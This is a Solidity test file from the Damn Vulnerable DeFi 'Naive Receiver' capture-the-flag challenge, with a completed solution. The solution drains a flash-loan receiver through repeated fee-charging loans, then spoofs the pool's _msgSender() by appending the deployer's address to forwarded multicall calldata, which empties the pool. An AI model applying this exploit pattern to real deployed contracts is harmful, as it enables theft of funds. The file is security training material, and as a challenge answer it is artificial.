// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // Prepare call data for 10 flash loans and 1 withdrawal
        bytes[] memory callDatas = new bytes[](11);

        // 1. Drain the FlashLoanReceiver contract by triggering 10 flash loans
        // Each flash loan costs a fixed 1 WETH fee, regardless of the borrowed amount
        for (uint i = 0; i < 10; i++) {
            callDatas[i] = abi.encodeCall(
                pool.flashLoan,
                (receiver, address(weth), 0, "0x")
            );
        }
        // At this point, the 10 flash loans will drain the 10 WETH from the receiver
        // and credit the deployer with 10 WETH in fees in the pool

        // 2. Exploit the vulnerability in the _msgSender() mechanism for the withdrawal
        // By adding the deployer's address at the end of the call data,
        // we force the pool to interpret this call as coming from the deployer
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(
                pool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
            ),
            bytes32(uint256(uint160(deployer)))
        );

        // Combine all calls into a single transaction via multicall
        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

        // 3. Create a request for the forwarder
        // This request will be validated by the forwarder through our signature
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player, // The actual sender is the player
            target: address(pool), // The target is the pool
            value: 0, // No ETH sent
            gas: gasleft(),
            nonce: forwarder.nonces(player), // Current nonce of the player in the forwarder
            data: multicallData, // The multicall data to execute all our calls
            deadline: block.timestamp + 3600 // Valid for one hour
        });

        // 4. Sign the request to prove we are indeed the player
        // Calculate the hash to sign according to EIP-712
        bytes32 dataHash = forwarder.getDataHash(request);
        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", forwarder.domainSeparator(), dataHash)
        );

        // Sign the hash with the player's private key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // 5. Execute the request via the forwarder
        // This will trigger all our calls in a single transaction
        forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
